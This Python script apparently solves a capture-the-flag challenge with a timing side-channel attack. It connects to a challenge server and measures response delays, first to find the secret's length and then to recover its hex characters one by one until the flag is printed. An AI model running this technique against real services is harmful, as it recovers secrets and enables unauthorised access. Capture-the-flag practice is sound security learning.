#!/usr/bin/env python3

import socket
import timeit
import sys


def send_and_recv(s, data):
    s.sendall(data)
    data = s.recv(1024)
    if b"flag" in data:
        print(data.decode())
        exit(0)


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <port>")
        exit(1)

    port = int(sys.argv[1])
    base = 0.13
    timing = 0.1

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("challenge.ctf.games", port))
    data = s.recv(1024)
    print(data.decode())

    length = 1
    while True:
        test = "X" * length + "\n"
        test = test.encode()
        t = timeit.timeit(lambda: send_and_recv(s, test), number=1)
        print(f"len: {length}, time: {t}")
        if t > timing + base:
            print(f"Found length: {length}")
            break
        length += 1

    alphabet = "abcdef1234567890"
    found = ""
    for i in range(length):
        for c in alphabet:
            test = found + c
            test = test.ljust(length, "X")
            test += "\n"
            test = test.encode()
            t = timeit.timeit(lambda: send_and_recv(s, test), number=1)
            print(f"test: {test}, time: {t}")
            check = (timing * (i + 1)) + base + timing
            print(f"check: {check}")
            if t > check:
                found += c
                print(f"Found: {found}")
                break

    s.close()


if __name__ == "__main__":
    main()
